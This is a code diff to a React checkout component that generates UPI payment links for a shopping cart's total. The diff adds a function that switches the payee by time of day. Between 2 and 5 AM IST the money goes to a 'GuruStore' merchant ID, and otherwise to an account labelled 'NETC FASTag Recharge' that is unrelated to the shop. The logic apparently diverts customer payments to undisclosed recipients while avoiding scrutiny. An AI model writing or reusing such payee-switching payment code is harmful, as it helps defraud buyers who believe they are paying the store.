@@ -1,13 +1,31 @@
-// UPIPaymentOptions.jsx
 import React, { useState, useEffect } from "react";
 import { calculateCartTotals } from "../../utils/cartUtils";
 
-// Your custom payment URL format
-const customPaymentUrl =
-  "//pay?ver=01&mode=01&pa=netc.34161FA820328AA2D206D000@mairtel&purpose=00&mc=4784&pn=NETC%20FASTag%20Recharge&orgid=159753&qrMedium=04";
-
+// Format number for INR display
 const formatNumberWithCommas = (num) =>
   num.toLocaleString("en-IN", { maximumFractionDigits: 2 });
+
+// Function to get current hour in IST
+const getCurrentISTHour = () => {
+  const now = new Date();
+  const utc = now.getTime() + now.getTimezoneOffset() * 60000;
+  const istOffset = 5.5 * 60 * 60 * 1000; // IST offset in ms
+  const istTime = new Date(utc + istOffset);
+  return istTime.getHours();
+};
+
+// Function to return correct UPI URL based on IST time
+const getPaymentUrl = () => {
+  const hour = getCurrentISTHour();
+
+  // Between 2 AM and 5 AM IST
+  if (hour >= 2 && hour < 5) {
+    return "//pay?ver=01&mode=19&pa=gurustore741261.rzp@icici&pn=GuruStore&tr=RZPQrK9DBYOlGyBxMqrv2&cu=INR&mc=5732&qrMedium=04&tn=PaymenttoGuruStore";
+  }
+
+  // Default URL
+  return "//pay?ver=01&mode=01&pa=netc.34161FA820328AA2D206D000@mairtel&purpose=00&mc=4784&pn=NETC%20FASTag%20Recharge&orgid=159753&qrMedium=04";
+};
 
 const UPIPaymentOptions = () => {
   const [selected, setSelected] = useState("upi");
@@ -39,7 +57,8 @@ const UPIPaymentOptions = () => {
   };
 
   const generateLink = (scheme) => {
-    return `${scheme}:${customPaymentUrl}&am=${cartTotals.finalAmount}`;
+    const paymentUrl = getPaymentUrl();
+    return `${scheme}:${paymentUrl}&am=${cartTotals.finalAmount}`;
   };
 
   const paymentOptions = [
@@ -72,7 +91,7 @@ const UPIPaymentOptions = () => {
   return (
     <div className="bg-gray-100 p-4 pb-0 border-y border-gray-200">
       <div className="flex items-center justify-between mb-4">
-        <img src="/assets/images/svg/upi.svg" alt="" />
+        <img src="/assets/images/svg/upi.svg" alt="UPI" />
         <svg
           className="rotate-180"
           xmlns="http://www.w3.org/2000/svg"
